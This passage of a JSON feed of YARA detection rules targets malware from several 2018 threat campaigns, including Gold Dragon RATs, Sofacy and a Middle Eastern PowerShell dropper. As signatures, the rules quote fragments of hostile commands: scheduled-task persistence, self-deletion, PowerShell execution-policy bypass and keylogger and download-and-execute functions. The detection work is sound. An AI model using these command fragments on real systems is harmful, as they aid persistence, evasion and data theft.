strings:\n      $x1 = \"User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 3000KB and $x1\n}","date":"2018-02-08 12:12:31","description":"Detects malware from disclosed CN malware set","minimum_yara":"1.7","name":"CN_disclosed_20180208_lsls_RID2FCC","reference":"https://twitter.com/cyberintproject/status/961714165550342146","required_modules":[],"rule_hash":"f8a614a236ca6786dd77dd410ea6857a","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule CN_disclosed_20180208_c_RID2E71 : DEMO EXE FILE MAL T1047 T1053 {\n   meta:\n      description = \"Detects malware from disclosed CN malware set\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyberintproject/status/961714165550342146\"\n      date = \"2018-02-08 11:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1047, T1053\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd.exe /c ping 0 -n 2 & del \\\"\" fullword wide\n      $x2 = \"schtasks /create /sc minute /mo 1 /tn Server /tr \" fullword wide\n      $x3 = \"www.upload.ee/image/\" wide\n      $s1 = \"winmgmts:\\\\\\\\.\\\\root\\\\SecurityCenter2\" fullword wide\n      $s2 = \"/Server.exe\" fullword wide\n      $s3 = \"Executed As \" fullword wide\n      $s4 = \"WmiPrvSE.exe\" fullword wide\n      $s5 = \"Stub.exe\" fullword ascii\n      $s6 = \"Download ERROR\" fullword wide\n      $s7 = \"shutdown -r -t 00\" fullword wide\n      $s8 = \"Select * From AntiVirusProduct\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 4 of them )\n}","date":"2018-02-08 11:14:41","description":"Detects malware from disclosed CN malware set","minimum_yara":"1.7","name":"CN_disclosed_20180208_c_RID2E71","reference":"https://twitter.com/cyberintproject/status/961714165550342146","required_modules":[],"rule_hash":"c372c0976ae31d89902c755293eea83c","score":75,"tags":["T1047","MAL","DEMO","T1053","FILE","EXE"]},{"author":"Florian Roth","content":"rule CN_disclosed_20180208_System3_RID30C6 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from disclosed CN malware set\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyberintproject/status/961714165550342146\"\n      date = \"2018-02-08 12:54:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"WmiPrvSE.exe\" fullword wide\n      $s1 = \"C:\\\\Users\\\\sgl\\\\AppData\\\\Local\\\\\" ascii\n      $s2 = \"Temporary Projects\\\\WmiPrvSE\\\\\" ascii\n      $s3 = \"$15a32a5d-4906-458a-8f57-402311afc1c1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and $a1 and 1 of ( $s* )\n}","date":"2018-02-08 12:54:11","description":"Detects malware from disclosed CN malware set","minimum_yara":"1.7","name":"CN_disclosed_20180208_System3_RID30C6","reference":"https://twitter.com/cyberintproject/status/961714165550342146","required_modules":[],"rule_hash":"9bcb5792841fded27d0d4c42d007a3b2","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule CN_disclosed_20180208_Mal1_RID2F59 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from disclosed CN malware set\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details\"\n      date = \"2018-02-08 11:53:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%SystemRoot%\\\\system32\\\\termsrvhack.dll\" fullword ascii\n      $x2 = \"User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" fullword ascii\n      $a1 = \"taskkill /f /im cmd.exe\" fullword ascii\n      $a2 = \"taskkill /f /im mstsc.exe\" fullword ascii\n      $a3 = \"taskkill /f /im taskmgr.exe\" fullword ascii\n      $a4 = \"taskkill /f /im regedit.exe\" fullword ascii\n      $a5 = \"taskkill /f /im mmc.exe\" fullword ascii\n      $s1 = \"K7TSecurity.exe\" fullword ascii\n      $s2 = \"ServUDaemon.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( pe.imphash ( ) == \"28e3a58132364197d7cb29ee104004bf\" or 1 of ( $x* ) or 3 of them )\n}","date":"2018-02-08 11:53:21","description":"Detects malware from disclosed CN malware set","minimum_yara":"1.7","name":"CN_disclosed_20180208_Mal1_RID2F59","reference":"https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details","required_modules":["pe"],"rule_hash":"3101e9f2544751c5f474e1ea29796d97","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule CN_disclosed_20180208_KeyLogger_1_RID3227 : DEMO EXE FILE MAL T1056 {\n   meta:\n      description = \"Detects malware from disclosed CN malware set\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details\"\n      date = \"2018-02-08 13:53:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1056\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"Process already elevated.\" fullword wide\n      $x3 = \"GetKeyloggErLogsResponse\" fullword ascii\n      $x4 = \"get_encryptedPassword\" fullword ascii\n      $x5 = \"DoDownloadAndExecute\" fullword ascii\n      $x6 = \"GetKeyloggeRLogs\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them\n}","date":"2018-02-08 13:53:01","description":"Detects malware from disclosed CN malware set","minimum_yara":"1.7","name":"CN_disclosed_20180208_KeyLogger_1_RID3227","reference":"https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details","required_modules":[],"rule_hash":"ce3aabef2fbe748d6253546c5caae118","score":75,"tags":["T1056","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule CN_disclosed_20180208_Mal4_RID2F5C : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from disclosed CN malware set\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details\"\n      date = \"2018-02-08 11:53:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Microsoft .Net Framework COM+ Support\" fullword ascii\n      $s2 = \"Microsoft .NET and Windows XP COM+ Integration with SOAP\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them and pe.exports ( \"SPACE\" )\n}","date":"2018-02-08 11:53:51","description":"Detects malware from disclosed CN malware set","minimum_yara":"1.7","name":"CN_disclosed_20180208_Mal4_RID2F5C","reference":"https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details","required_modules":["pe"],"rule_hash":"74c9e534cb34e029f3644d02818d7433","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule CN_disclosed_20180208_Mal5_RID2F5D : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from disclosed CN malware set\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details\"\n      date = \"2018-02-08 11:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"4System.Web.Services.Protocols.SoapHttpClientProtocol\" fullword ascii\n      $s2 = \"Server.exe\" fullword ascii\n      $s3 = \"System.Windows.Forms.Form\" fullword ascii\n      $s4 = \"Stub.Resources.resources\" fullword ascii\n      $s5 = \"My.Computer\" fullword ascii\n      $s6 = \"MyTemplate\" fullword ascii\n      $s7 = \"Stub.My.Resources\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2018-02-08 11:54:01","description":"Detects malware from disclosed CN malware set","minimum_yara":"1.7","name":"CN_disclosed_20180208_Mal5_RID2F5D","reference":"https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details","required_modules":[],"rule_hash":"e85aeaa15f1e8b82d5b0b95c0f9a90f2","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule WScript_Shell_PowerShell_Combo_RID32E7 : ANOMALY DEMO SCRIPT T1064 T1086 {\n   meta:\n      description = \"Detects malware from Middle Eastern campaign reported by Talos\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n      date = \"2018-02-07 14:25:01\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"ANOMALY, DEMO, SCRIPT, T1064, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".CreateObject(\\\"WScript.Shell\\\")\" ascii\n      $p1 = \"powershell.exe\" fullword ascii\n      $p2 = \"-ExecutionPolicy Bypass\" fullword ascii\n      $p3 = \"[System.Convert]::FromBase64String(\" ascii\n      $fp1 = \"Copyright: Microsoft Corp.\" ascii\n   condition: \n      filesize < 400KB and $s1 and 1 of ( $p* ) and not 1 of ( $fp* )\n}","date":"2018-02-07 14:25:01","description":"Detects malware from Middle Eastern campaign reported by Talos","minimum_yara":"1.7","name":"WScript_Shell_PowerShell_Combo_RID32E7","reference":"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html","required_modules":[],"rule_hash":"b8cc1daa7a53a303934ab6441df1fae8","score":50,"tags":["DEMO","T1064","T1086","SCRIPT","ANOMALY"]},{"author":"Florian Roth","content":"rule Sofacy_Campaign_Mal_Feb18_cdnver_RID3324 : APT DEMO EXE FILE RUSSIA {\n   meta:\n      description = \"Detects Sofacy malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ClearskySec/status/960924755355369472\"\n      date = \"2018-02-07 14:35:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cdnver.dll\" fullword wide\n      $x2 = { 25 73 0A 00 00 00 00 00 30 00 00 00 20 00 2D 00\n              20 00 00 00 0A 00 00 00 25 00 73 00 00 00 00 00\n              69 00 6D 00 61 00 67 00 65 00 2F 00 6A 00 70 00\n              65 00 67 } \n      $s1 = \"S7%s - %lu\" fullword ascii\n      $s2 = \"SNFIRNW\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 90KB and ( pe.imphash ( ) == \"01f3d0fe6fb9d9df24620e67afc143c7\" or 1 of ( $x* ) or 2 of them )\n}","date":"2018-02-07 14:35:11","description":"Detects Sofacy malware","minimum_yara":"1.7","name":"Sofacy_Campaign_Mal_Feb18_cdnver_RID3324","reference":"https://twitter.com/ClearskySec/status/960924755355369472","required_modules":["pe"],"rule_hash":"f33cf799f92109d2249f2adbf8912538","score":75,"tags":["APT","RUSSIA","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule ME_Campaign_Malware_1_RID2EDA : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Middle Eastern campaign reported by Talos\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n      date = \"2018-02-07 11:32:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and ( pe.imphash ( ) == \"618f76eaf4bd95c690d43e84d617efe9\" )\n}","date":"2018-02-07 11:32:11","description":"Detects malware from Middle Eastern campaign reported by Talos","minimum_yara":"1.7","name":"ME_Campaign_Malware_1_RID2EDA","reference":"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html","required_modules":["pe"],"rule_hash":"ec6583f6d6d6876d34d35e4a61c6ac59","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule ME_Campaign_Malware_2_RID2EDB : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Middle Eastern campaign reported by Talos\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n      date = \"2018-02-07 11:32:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"QuickAssist.exe\" fullword wide\n      $s2 = \"<description>Microsoft Modern Sharing Solution</description>\" fullword ascii\n      $s3 = \"GBEWCWA\" fullword ascii\n      $s4 = \"name=\\\"QuickAssist\\\" \" fullword ascii\n      $s5 = \"Cimzal\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == \"b06055e6cc2a804111ab6964df1ca4ae\" or 4 of them )\n}","date":"2018-02-07 11:32:21","description":"Detects malware from Middle Eastern campaign reported by Talos","minimum_yara":"1.7","name":"ME_Campaign_Malware_2_RID2EDB","reference":"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html","required_modules":["pe"],"rule_hash":"b5cc325864903b8976a636cecf3ca7fd","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule ME_Campaign_Malware_3_RID2EDC : APT DEMO FILE MAL {\n   meta:\n      description = \"Detects malware from Middle Eastern campaign reported by Talos\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n      date = \"2018-02-07 11:32:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"objWShell.Run \\\"powershell.exe -ExecutionPolicy Bypass -File \\\"\\\"%appdata%\\\"\\\"\\\\sys.ps1\\\", 0 \" fullword ascii\n      $x2 = \"objFile.WriteLine \\\"New-Item -Path \\\"\\\"$ENV:APPDATA\\\\Microsoft\\\\Templates\\\"\\\" -ItemType Directory -Force }\\\" \" fullword ascii\n      $x3 = \"objFile.WriteLine \\\"$path = \\\"\\\"$ENV:APPDATA\\\\Microsoft\\\\Templates\\\\Report.doc\\\"\\\"\\\" \" fullword ascii\n      $s4 = \"File=appData & \\\"\\\\sys.ps1\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x6553 and filesize < 400KB and 1 of them\n}","date":"2018-02-07 11:32:31","description":"Detects malware from Middle Eastern campaign reported by Talos","minimum_yara":"1.7","name":"ME_Campaign_Malware_3_RID2EDC","reference":"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html","required_modules":[],"rule_hash":"9dd6ca5777d2d584cf595a3c5567416e","score":75,"tags":["APT","DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule ME_Campaign_Malware_4_RID2EDD : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Middle Eastern campaign reported by Talos\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n      date = \"2018-02-07 11:32:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and pe.imphash ( ) == \"fb7da233a35ac523d6059fff543627ab\"\n}","date":"2018-02-07 11:32:41","description":"Detects malware from Middle Eastern campaign reported by Talos","minimum_yara":"1.7","name":"ME_Campaign_Malware_4_RID2EDD","reference":"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html","required_modules":["pe"],"rule_hash":"ddbc49108a4b4aa4f3ff6064e4503f91","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule ME_Campaign_Malware_5_RID2EDE : APT DEMO EXE FILE MAL T1047 {\n   meta:\n      description = \"Detects malware from Middle Eastern campaign reported by Talos\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n      date = \"2018-02-07 11:32:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1047\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"D:\\\\me\\\\do\\\\do\\\\obj\\\\\" ascii\n      $s2 = \"Select * from Win32_ComputerSystem\" fullword wide\n      $s3 = \"Get_Antivirus\" fullword ascii\n      $s4 = \"{{\\\"id\\\":\\\"{0}\\\",\\\"user\\\":\\\"{1}\\\",\\\"path\\\":\\\"{2}\\\"}}\" fullword wide\n      $s5 = \"update software online\" fullword wide\n      $s6 = \"time.nist.gov\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and ( pe.imphash ( ) == \"f34d5f2d4577ed6d9ceec516c1f5a744\" and ( 8 of them ) ) or ( all of them )\n}","date":"2018-02-07 11:32:51","description":"Detects malware from Middle Eastern campaign reported by Talos","minimum_yara":"1.7","name":"ME_Campaign_Malware_5_RID2EDE","reference":"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html","required_modules":["pe"],"rule_hash":"1a4405d9e838d5ba0fa547a5eed3ffe5","score":75,"tags":["T1047","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule GoldDragon_malware_Feb18_1_RID309F : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from Gold Dragon report\"\n      author = \"Florian Roth\"\n      reference = \"https://securingtomorrow.mcafee.com/mcafee-labs/gold-dragon-widens-olympics-malware-attacks-gains-permanent-presence-on-victims-systems/\"\n      date = \"2018-02-03 12:47:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"168c2f7752511dfd263a83d5d08a90db\" or pe.imphash ( ) == \"0606858bdeb129de33a2b095d7806e74\" or pe.imphash ( ) == \"51d992f5b9e01533eb1356323ed1cb0f\" or pe.imphash ( ) == \"bb801224abd8562f9ee8fb261b75e32a\" )\n}","date":"2018-02-03 12:47:41","description":"Detects malware from Gold Dragon report","minimum_yara":"1.7","name":"GoldDragon_malware_Feb18_1_RID309F","reference":"https://securingtomorrow.mcafee.com/mcafee-labs/gold-dragon-widens-olympics-malware-attacks-gains-permanent-presence-on-victims-systems/","required_modules":["pe"],"rule_hash":"6b9e865c3d6f03743045bb450ad5ad97","score":90,"tags":["APT","DEMO","EXE","CHINA","FILE"]},{"author":"Florian Roth","content":"rule GoldDragon_Aux_File_RID2E5E : APT CHINA DEMO {\n   meta:\n      description = \"Detects export from Gold Dragon - February 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://securingtomorrow.mcafee.com/mcafee-labs/gold-dragon-widens-olympics-malware-attacks-gains-permanent-presence-on-victims-systems/\"\n      date = \"2018-02-03 11:11:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/////////////////////regkeyenum////////////\" ascii\n   condition: \n      filesize < 500KB and 1 of them\n}","date":"2018-02-03 11:11:31","description":"Detects export from Gold Dragon - February 2018","minimum_yara":"1.7","name":"GoldDragon_Aux_File_RID2E5E","reference":"https://securingtomorrow.mcafee.com/mcafee-labs/gold-dragon-widens-olympics-malware-attacks-gains-permanent-presence-on-victims-systems/","required_modules":[],"rule_hash":"27f7bccaf84780a16ab91ccc4037fbfd","score":90,"tags":["APT","DEMO","CHINA"]},{"author":"Florian Roth","content":"rule GoldDragon_Ghost419_RAT_RID2F3A : APT CHINA DEMO EXE FILE MAL T1082 T1083 {\n   meta:\n      description = \"Detects Ghost419 RAT from Gold Dragon report\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/rW1yvZ\"\n      date = \"2018-02-03 11:48:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL, T1082, T1083\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322)\" fullword ascii\n      $x2 = \"WebKitFormBoundarywhpFxMBe19cSjFnG\" ascii\n      $x3 = \"\\\\Microsoft\\\\HNC\\\\\" fullword ascii\n      $x4 = \"\\\\anternet abplorer\" fullword ascii\n      $x5 = \"%s\\\\abxplore.exe\" fullword ascii\n      $x6 = \"GHOST419\" fullword ascii\n      $x7 = \"I,m Online. %04d - %02d - %02d - %02d - %02d\" fullword ascii\n      $x8 = \"//////////////////////////regkeyenum//////////////\" fullword ascii\n      $s1 = \"www.GoldDragon.com\" fullword ascii\n      $s2 = \"/c systeminfo >> %s\" fullword ascii\n      $s3 = \"/c dir %s\\\\ >> %s\" fullword ascii\n      $s4 = \"DownLoading %02x, %02x, %02x\" fullword ascii\n      $s5 = \"Tran_dll.dll\" fullword ascii\n      $s6 = \"MpCmdRunkr.dll\" fullword ascii\n      $s7 = \"MpCmdRun.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.exports ( \"ExportFunction\" ) or 1 of ( $x* ) or 2 of them )\n}","date":"2018-02-03 11:48:11","description":"Detects Ghost419 RAT from Gold Dragon report","minimum_yara":"1.7","name":"GoldDragon_Ghost419_RAT_RID2F3A","reference":"https://goo.gl/rW1yvZ","required_modules":["pe"],"rule_hash":"b8dc2e479c7716472fd03d13ca14d7f6","score":75,"tags":["T1082","MAL","DEMO","FILE","APT","CHINA","T1083","EXE"]},{"author":"Florian Roth","content":"rule GoldDragon_RunningRAT_RID2F19 : APT CHINA DEMO EXE FILE MAL T1085 {\n   meta:\n      description = \"Detects Running RAT from Gold Dragon report\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/rW1yvZ\"\n      date = \"2018-02-03 11:42:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL, T1085\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\USERS\\\\WIN7_x64\\\\result.log\" fullword wide\n      $x2 = \"rundll32.exe %s RunningRat\" fullword ascii\n      $x3 = \"SystemRat.dll\" fullword ascii\n      $x4 = \"rundll32.exe %s ExportFunction\" fullword ascii\n      $x5 = \"rundll32.exe \\\"%s\\\" RunningRat\" fullword ascii\n      $x6 = \"ixeorat.bin\" fullword ascii\n      $x7 = \"C:\\\\USERS\\\\Public\\\\result.log\" fullword ascii\n      $a1 = \"emanybtsohteg\" fullword ascii\n      $a2 = \"tekcosesolc\" fullword ascii\n      $a3 = \"emankcosteg\" fullword ascii\n      $a4 = \"emantsohteg\" fullword ascii\n      $a5 = \"tpokcostes\" fullword ascii\n      $a6 = \"putratSASW\" fullword ascii\n      $s1 = \"ParentDll.dll\" fullword ascii\n      $s2 = \"MR - Already Existed\" fullword ascii\n      $s3 = \"MR First Started, Registed OK!\" fullword ascii\n      $s4 = \"RM-M : LoadResource OK!\" fullword ascii\n      $s5 = \"D:\\\\result.log\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"c78ccc8f02286648c4373d3bf03efc43\" or pe.exports ( \"RunningRat\" ) or 1 of ( $x* ) or 5 of ( $a* ) or 3 of ( $s* ) )\n}","date":"2018-02-03 11:42:41","description":"Detects Running RAT from Gold Dragon report","minimum_yara":"1.7","name":"GoldDragon_RunningRAT_RID2F19","reference":"https://goo.gl/rW1yvZ","required_modules":["pe"],"rule_hash":"8ed341d9704cab0e0a449968c46e5609","score":75,"tags":["MAL","DEMO","FILE","APT","T1085","CHINA","EXE"]},{"author":"Florian Roth","content":"rule GoldDragon_RunnignRAT_RID2F19 : APT CHINA DEMO EXE FILE MAL T1057 T1082 T1085 {\n   meta:\n      description = \"Detects Running RAT malware from Gold Dragon report\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/rW1yvZ\"\n      date = \"2018-02-03 11:42:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL, T1057, T1082, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd.exe /c systeminfo \" fullword ascii\n      $s2 = \"ieproxy.dll\" fullword ascii\n      $s3 = \"taskkill /f /im daumcleaner.exe\" fullword ascii\n      $s4 = \"cmd.exe /c tasklist \" fullword ascii\n      $s5 = \"rundll32.exe \\\"%s\\\" Run\" fullword ascii\n      $s6 = \"Mozilla/5.0 (Windows NT 5.2; rv:12.0) Gecko/20100101 Firefox/12.0\" fullword ascii\n      $s7 = \"%s\\\\%s_%03d\" fullword wide\n      $s8 = \"\\\\PI_001.dat\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 3 of them )\n}","date":"2018-02-03 11:42:41","description":"Detects Running RAT malware from Gold Dragon report","minimum_yara":"1.7","name":"GoldDragon_RunnignRAT_RID2F19","reference":"https://goo.gl/rW1yvZ","required_modules":[],"rule_hash":"a40682a7cd679c5b38e6293375905607","score":75,"tags":["T1057","T1082","MAL","DEMO","FILE","APT","T1085","CHINA","EXE"]},{"author":"Florian Roth","content":"rule Scarcruft_malware_Feb18_1_RID306B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Scarcruft malware - February 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/craiu/status/959477129795731458\"\n      date = \"2018-02-03 12:39:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"d:\\\\HighSchool\\\\version 13\\\\2ndBD\\\\T+M\\\\\" ascii\n      $x2 = \"cmd.exe /C ping 0.1.1.2\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}","date":"2018-02-03 12:39:01","description":"Detects Scarcruft malware - February 2018","minimum_yara":"1.7","name":"Scarcruft_malware_Feb18_1_RID306B","reference":"https://twitter.com/craiu/status/959477129795731458","required_modules":[],"rule_hash":"f35dc7716fc3dea291748271c4b13750","score":90,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule TopHat_Malware_Jan18_2_RID2EFB : APT DEMO EXE FILE MAL T1050 {\n   meta:\n      description = \"Semiautomatic generated rule - file e.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services/#appendix\"\n      date = \"2018-01-29 11:37:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1050\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\FontSubstitutes\" fullword ascii\n      $s2 = \"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Keyboard Layouts\\\\\" fullword ascii\n      $s3 = \"LError loading dock zone from the stream. Expecting version %d, but found %d.\" fullword 